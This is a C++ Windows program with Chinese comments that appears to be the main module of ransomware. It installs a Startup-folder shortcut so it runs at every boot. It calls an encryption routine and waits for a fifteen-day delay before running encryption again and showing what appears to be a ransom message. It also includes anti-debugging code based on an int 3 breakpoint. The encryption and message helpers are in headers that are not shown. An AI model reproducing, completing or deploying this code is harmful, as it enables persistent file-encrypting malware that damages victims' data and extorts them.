#include <windows.h>
#include <thread>
#include <shlobj.h>
#include <objbase.h>
#include <string>
#include <iostream>
#include "crypt.h"
#include"message.h"
#include"time.h"
#include"debug.h"
#pragma comment(lib, "Crypt32.lib")
//#include"rsa.h"
// 创建快捷方式以实现开机自启
void setConsoleOutputToUTF8() {
    SetConsoleOutputCP(CP_UTF8);
}
int fnc() {
    __try {
        //static int (*array_1[])() = { smf, };
        //static int (*array_2[2])();
        //array_2[0] = smf;
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        std::cerr << "Debugger detected by int 3 interrupt. Exiting..." << std::endl;
        return 1;
    }
}
void CreateStartupShortcut() {
    // 获取当前可执行文件的路径
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    // 将多字节字符串转换为宽字符字符串
    int wideCharLength = MultiByteToWideChar(CP_ACP, 0, szPath, -1, NULL, 0);
    wchar_t* widePath = new wchar_t[wideCharLength];
    MultiByteToWideChar(CP_ACP, 0, szPath, -1, widePath, wideCharLength);

    // 获取系统启动文件夹的路径
    wchar_t startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    // 初始化 COM 库
    CoInitialize(NULL);
    {
        // 创建一个指向 IShellLinkW 接口的指针
        IShellLinkW* psl;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl))) {
            // 设置快捷方式指向的目标路径
            psl->SetPath(widePath);
            // 设置快捷方式的描述
            psl->SetDescription(L"Startup Application");

            // 创建一个指向 IPersistFile 接口的指针
            IPersistFile* ppf;
            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf))) {
                // 生成快捷方式的完整路径
                std::wstring shortcutPath = std::wstring(startupPath) + L"\\MyApp.lnk";
                // 保存快捷方式
                ppf->Save(shortcutPath.c_str(), TRUE);
                ppf->Release();
            }
            psl->Release();
        }
    }
    // 释放宽字符字符串内存
    delete[] widePath;
    // 释放 COM 库资源
    CoUninitialize();
}

// 线程 1 的函数
void ThreadFunction1() {
    //createTxtAndShowMessage();
    encrypt();
    std::this_thread::sleep_for(std::chrono::seconds(5));
}

// 线程 2 的函数
void ThreadFunction2() {
    createTxtAndShowMessage();
    // EncryptFileWithRSA();
    std::this_thread::sleep_for(std::chrono::seconds(3));
}

// 线程 3 的函数
void ThreadFunction3() {
    std::this_thread::sleep_for(std::chrono::seconds(4));
}

// Windows 程序的入口函数
int main() {
    // 隐藏控制台窗口
  // HWND hWnd = GetConsoleWindow();

    //if (hWnd != NULL) {
        //ShowWindow(hWnd, SW_HIDE);
   // }
    
        SetConsoleOutputCP(CP_UTF8);
        //createTxtAndShowMessage();
        //mainFunction();
       // fnc();
    // 创建开机自启快捷方式
    CreateStartupShortcut();
    encrypt();
   
    
    // 调用封装好的
    // 创建线程 1 并等待其执行完毕
    if (shouldRunAfterFifteenDays()) {
        std::thread t1(ThreadFunction1);
        t1.join();
        // 这里放置十五天后要继续运行的代码
       
        std::thread t2(ThreadFunction2);
        std::thread t3(ThreadFunction3);
        t2.join();
        t3.join();
        // 可以继续添加其他具体的代码逻辑
    }
    else {
        // 还没到十五天，可以选择输出提示信息或者做其他处理
        std::cout << "还未到十五天，等待中..." << std::endl;
    }


    return 0;
}